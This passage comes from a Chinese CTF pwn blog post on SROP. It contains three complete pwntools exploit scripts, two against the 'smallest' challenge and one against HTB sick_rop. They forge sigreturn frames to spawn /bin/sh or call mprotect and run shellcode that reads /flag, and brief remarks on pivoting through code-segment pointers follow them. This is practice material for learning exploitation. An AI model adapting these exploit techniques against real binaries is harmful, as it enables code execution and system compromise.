class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#python2</span><br><span class="hljs-comment"># -*- coding: utf-8 -*</span><br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><br>se      = <span class="hljs-keyword">lambda</span> data               :p.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :p.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :p.recv(numb)<br>ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :p.recvuntil(delims, drop)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :p.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params"><span class="hljs-built_in">breakpoint</span>=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>    glibc_dir = <span class="hljs-string">&#x27;~/Exps/Glibc/glibc-2.27/&#x27;</span><br>    gdbscript = <span class="hljs-string">&#x27;directory %smalloc/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %sstdio-common/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %sstdlib/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %slibio/\n&#x27;</span> % glibc_dir<br>    elf_base = <span class="hljs-built_in">int</span>(os.popen(<span class="hljs-string">&#x27;pmap &#123;&#125;| awk \x27&#123;&#123;print \x241&#125;&#125;\x27&#x27;</span>.<span class="hljs-built_in">format</span>(p.pid)).readlines()[<span class="hljs-number">1</span>], <span class="hljs-number">16</span>) <span class="hljs-keyword">if</span> elf.pie <span class="hljs-keyword">else</span> <span class="hljs-number">0</span><br>    gdbscript += <span class="hljs-string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">int</span>(<span class="hljs-built_in">breakpoint</span>) + elf_base) <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(<span class="hljs-built_in">breakpoint</span>, <span class="hljs-built_in">int</span>) <span class="hljs-keyword">else</span> <span class="hljs-built_in">breakpoint</span><br>    gdb.attach(p, gdbscript)<br>    time.sleep(<span class="hljs-number">1</span>)<br><br>elf = ELF(<span class="hljs-string">&#x27;./smallest&#x27;</span>)<br>context(arch = elf.arch, os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-h&#x27;</span>])<br>p = process(<span class="hljs-string">&#x27;./smallest&#x27;</span>)<br><span class="hljs-comment"># debug()</span><br><span class="hljs-comment"># p = remote(&#x27;node4.buuoj.cn&#x27;,26278)</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">.text:00000000004000B0                 xor     rax, rax</span><br><span class="hljs-string">.text:00000000004000B3                 mov     edx, 400h       ; count</span><br><span class="hljs-string">.text:00000000004000B8                 mov     rsi, rsp        ; buf</span><br><span class="hljs-string">.text:00000000004000BB                 mov     rdi, rax        ; fd</span><br><span class="hljs-string">.text:00000000004000BE                 syscall                 ; LINUX - sys_read</span><br><span class="hljs-string">.text:00000000004000C0                 retn</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>vuln_addr = <span class="hljs-number">0x4000B0</span><br>NOxor_vuln = <span class="hljs-number">0x4000B3</span><br>syscall_ret = <span class="hljs-number">0x4000BE</span><br>fuck = SigreturnFrame()<br>fuck.rax = <span class="hljs-number">0</span><br>fuck.rdi = <span class="hljs-number">0</span><br><br>payload=flat(<br>    [vuln_addr,vuln_addr,vuln_addr]<br>)<br>se(payload)<br>se(<span class="hljs-string">&#x27;\xB3&#x27;</span>)<br>rc(<span class="hljs-number">8</span>)<br>stack_addr = uu64(rc(<span class="hljs-number">8</span>))<br>stack_addr = stack_addr&gt;&gt;<span class="hljs-number">4</span><br>stack_addr = stack_addr&lt;&lt;<span class="hljs-number">4</span><br>info_addr(<span class="hljs-string">&#x27;stack&#x27;</span>,stack_addr)<br>fuck = SigreturnFrame()<br>fuck.rax = <span class="hljs-number">0</span><br>fuck.rdi = <span class="hljs-number">0</span><br>fuck.rsi = stack_addr<br>fuck.rdx = <span class="hljs-number">0x400</span><br>fuck.rsp = stack_addr<br>fuck.rip = syscall_ret<br><br>payload=flat(<br>    [vuln_addr,<span class="hljs-number">0</span>,fuck]<br>)<br>se(payload)<br>se(p64(NOxor_vuln)+<span class="hljs-built_in">str</span>(fuck)[:<span class="hljs-number">7</span>])<br>wsnd = SigreturnFrame()<br>wsnd.rax = <span class="hljs-number">59</span><br>wsnd.rdi = stack_addr + <span class="hljs-number">0x200</span><br>wsnd.rsi = <span class="hljs-number">0</span><br>wsnd.rdx = <span class="hljs-number">0</span><br>wsnd.rsp = stack_addr<br>wsnd.rip = syscall_ret<br>payload=(p64(vuln_addr)+p64(<span class="hljs-number">0</span>)+<span class="hljs-built_in">str</span>(wsnd)).ljust(<span class="hljs-number">0x200</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+<span class="hljs-string">&#x27;/bin/sh\0&#x27;</span><br>se(payload)<br>se(p64(NOxor_vuln)+<span class="hljs-built_in">str</span>(wsnd)[:<span class="hljs-number">7</span>])<br><br>p.interactive()<br></code></pre></td></tr></table></figure>
+<h4 id="Exp-orw"><a class="header-anchor" href="#Exp-orw">¶</a>Exp(orw)</h4>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#python2</span><br><span class="hljs-comment"># -*- coding: utf-8 -*</span><br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><br>se      = <span class="hljs-keyword">lambda</span> data               :p.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :p.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :p.recv(numb)<br>ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :p.recvuntil(delims, drop)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :p.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params"><span class="hljs-built_in">breakpoint</span>=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>    glibc_dir = <span class="hljs-string">&#x27;~/Exps/Glibc/glibc-2.27/&#x27;</span><br>    gdbscript = <span class="hljs-string">&#x27;directory %smalloc/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %sstdio-common/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %sstdlib/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %slibio/\n&#x27;</span> % glibc_dir<br>    elf_base = <span class="hljs-built_in">int</span>(os.popen(<span class="hljs-string">&#x27;pmap &#123;&#125;| awk \x27&#123;&#123;print \x241&#125;&#125;\x27&#x27;</span>.<span class="hljs-built_in">format</span>(p.pid)).readlines()[<span class="hljs-number">1</span>], <span class="hljs-number">16</span>) <span class="hljs-keyword">if</span> elf.pie <span class="hljs-keyword">else</span> <span class="hljs-number">0</span><br>    gdbscript += <span class="hljs-string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">int</span>(<span class="hljs-built_in">breakpoint</span>) + elf_base) <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(<span class="hljs-built_in">breakpoint</span>, <span class="hljs-built_in">int</span>) <span class="hljs-keyword">else</span> <span class="hljs-built_in">breakpoint</span><br>    gdb.attach(p, gdbscript)<br>    time.sleep(<span class="hljs-number">1</span>)<br><br>elf = ELF(<span class="hljs-string">&#x27;./smallest&#x27;</span>)<br>context(arch = elf.arch, os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-h&#x27;</span>])<br><span class="hljs-comment"># p = process(&#x27;./smallest&#x27;)</span><br><span class="hljs-comment"># debug()</span><br>p = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">26278</span>)<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">.text:00000000004000B0                 xor     rax, rax</span><br><span class="hljs-string">.text:00000000004000B3                 mov     edx, 400h       ; count</span><br><span class="hljs-string">.text:00000000004000B8                 mov     rsi, rsp        ; buf</span><br><span class="hljs-string">.text:00000000004000BB                 mov     rdi, rax        ; fd</span><br><span class="hljs-string">.text:00000000004000BE                 syscall                 ; LINUX - sys_read</span><br><span class="hljs-string">.text:00000000004000C0                 retn</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>vuln_addr = <span class="hljs-number">0x4000B0</span><br>NOxor_vuln = <span class="hljs-number">0x4000B3</span><br>syscall_ret = <span class="hljs-number">0x4000BE</span><br>fuck = SigreturnFrame()<br>fuck.rax = <span class="hljs-number">0</span><br>fuck.rdi = <span class="hljs-number">0</span><br><br>payload=flat(<br>    [vuln_addr,vuln_addr,vuln_addr]<br>)<br>se(payload)<br>se(<span class="hljs-string">&#x27;\xB3&#x27;</span>)<br>rc(<span class="hljs-number">8</span>)<br>stack_addr = uu64(rc(<span class="hljs-number">8</span>))<br>stack_addr = stack_addr&gt;&gt;<span class="hljs-number">4</span><br>stack_addr = stack_addr&lt;&lt;<span class="hljs-number">4</span><br>info_addr(<span class="hljs-string">&#x27;stack&#x27;</span>,stack_addr)<br>fuck = SigreturnFrame()<br>fuck.rax = <span class="hljs-number">0</span><br>fuck.rdi = <span class="hljs-number">0</span><br>fuck.rsi = stack_addr<br>fuck.rdx = <span class="hljs-number">0x400</span><br>fuck.rsp = stack_addr<br>fuck.rip = syscall_ret<br><br>payload=flat(<br>    [vuln_addr,<span class="hljs-number">0</span>,fuck]<br>)<br>se(payload)<br>se(p64(NOxor_vuln)+<span class="hljs-built_in">str</span>(fuck)[:<span class="hljs-number">7</span>])<br>wsnd = SigreturnFrame()<br>wsnd.rax = <span class="hljs-number">10</span><br>wsnd.rdi = (stack_addr&gt;&gt;<span class="hljs-number">12</span>)&lt;&lt;<span class="hljs-number">12</span><br>wsnd.rsi = <span class="hljs-number">0x1000</span><br>wsnd.rdx = <span class="hljs-number">7</span><br>wsnd.rsp = stack_addr<br>wsnd.rip = syscall_ret<br>payload=(p64(vuln_addr)+p64(<span class="hljs-number">0</span>)+<span class="hljs-built_in">str</span>(wsnd)).ljust(<span class="hljs-number">0x200</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+<span class="hljs-built_in">str</span>(asm(shellcraft.cat(<span class="hljs-string">&#x27;/flag&#x27;</span>)))<br>se(payload)<br>se(p64(NOxor_vuln)+<span class="hljs-built_in">str</span>(wsnd)[:<span class="hljs-number">7</span>])<br><br>se(p64(stack_addr+<span class="hljs-number">0x200</span>))<br><br><br>p.interactive()<br></code></pre></td></tr></table></figure>
+<p>变量名是不是很帅，没啥用，就本地打通， 💨 远程一个都打不通，run 了 run 了。</p>
+<hr>
+<p><em><strong>2022/5/4 0:18 补充</strong></em>：<strong>SROP 在没地方落脚（指写 rsp 或者 rip 的时候），一定记得 vmmap 之后 <code>x/100xg</code> 查看一下代码段有无 text 段指针可以当跳板。</strong></p>
+<h3 id="HTB-sick-rop（扬-text-段）"><a class="header-anchor" href="#HTB-sick-rop（扬-text-段）">¶</a>HTB - sick_rop（扬 text 段）</h3>
+<p>由于网络原因远程没打通，罢 🐦 。主要是利用代码段残留的指针，这里可以写俩次 SROP 执行 <code>/bin/sh\0</code> getshell。</p>
+<p>但是写 <code>mprotect</code> 其实真的只用写一次然后改 rip 就行了。因为没有其他的地址可以落脚，直接把<strong>整个代码段扬成 <code>rwx</code> 就好了</strong>QwQ。非常滴狂野快乐 crazy 不讲道理。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python2</span><br><span class="hljs-comment"># -*- coding: utf-8 -*</span><br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><br>se      = <span class="hljs-keyword">lambda</span> data               :p.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :p.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :p.recv(numb)<br>ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :p.recvuntil(delims, drop)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :p.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params"><span class="hljs-built_in">breakpoint</span>=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>    glibc_dir = <span class="hljs-string">&#x27;~/Exps/Glibc/glibc-2.27/&#x27;</span><br>    gdbscript = <span class="hljs-string">&#x27;directory %smalloc/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %sstdio-common/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %sstdlib/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %slibio/\n&#x27;</span> % glibc_dir<br>    elf_base = <span class="hljs-built_in">int</span>(os.popen(<span class="hljs-string">&#x27;pmap &#123;&#125;| awk \x27&#123;&#123;print \x241&#125;&#125;\x27&#x27;</span>.<span class="hljs-built_in">format</span>(p.pid)).readlines()[<span class="hljs-number">1</span>], <span class="hljs-number">16</span>) <span class="hljs-keyword">if</span> elf.pie <span class="hljs-keyword">else</span> <span class="hljs-number">0</span><br>    gdbscript += <span class="hljs-string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">int</span>(<span class="hljs-built_in">breakpoint</span>) + elf_base) <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(<span class="hljs-built_in">breakpoint</span>, <span class="hljs-built_in">int</span>) <span class="hljs-keyword">else</span> <span class="hljs-built_in">breakpoint</span><br>    gdb.attach(p, gdbscript)<br>    time.sleep(<span class="hljs-number">1</span>)<br><br>elf = ELF(<span class="hljs-string">&#x27;./sick_rop&#x27;</span>)<br>context(arch = elf.arch, os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-h&#x27;</span>])<br>p = process(<span class="hljs-string">&#x27;./sick_rop&#x27;</span>)<br>debug()<br><span class="hljs-comment"># p = remote(&#x27;157.245.40.78&#x27;,32071)</span><br>vul = <span class="hljs-number">0x40102E</span><br>syscall_ret = <span class="hljs-number">0x40102B</span> <br><br>fuck = SigreturnFrame()<br>fuck.rax = <span class="hljs-number">10</span><br>fuck.rdi = <span class="hljs-number">0x401000</span><br>fuck.rsi = <span class="hljs-number">0x2000</span><br>fuck.rdx = <span class="hljs-number">7</span><br>fuck.rsp = <span class="hljs-number">0x4010d8</span><br>fuck.rip = syscall_ret<br><br>payload=flat(<br>    [<span class="hljs-string">&#x27;A&#x27;</span>*<span class="hljs-number">0x20</span>,<span class="hljs-number">0xdeadbeef</span>,vul,syscall_ret,fuck]<br>)<br>sl(payload)<br>pause()<br>se(<span class="hljs-string">&#x27;A&#x27;</span>*<span class="hljs-number">15</span>)<br><br>payload=flat(<br>    [<span class="hljs-string">&#x27;wsnd\0&#x27;</span>.ljust(<span class="hljs-number">0x28</span>,<span class="hljs-string">&#x27;\0&#x27;</span>),vul,<span class="hljs-number">0x4010f0</span>,asm(shellcraft.sh())] <br>)<br>pause()<br>se(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>
+<hr>
+<h1>Ret2dlresolve</h1>
+<p>学不会，成消愁了，以后补上吧（但愿）。run 了 run 了。</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/CTF/" class="category-chain-item">CTF</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/CTF/Pwn/" class="category-chain-item">Pwn</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/CTF/Pwn/srop/" class="category-chain-item">srop</a>
+  
+  
+
+  
+
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>SROP</div>
+      <div>http://n1ghtu.github.io/posts/341e3484.html</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Nightu</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2022年3月28日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/posts/9b2926e8.html" title="【EP.01】 musl-libc">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">【EP.01】 musl-libc</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a><span>Nightus Blog</span></a><br/> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Powered by Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
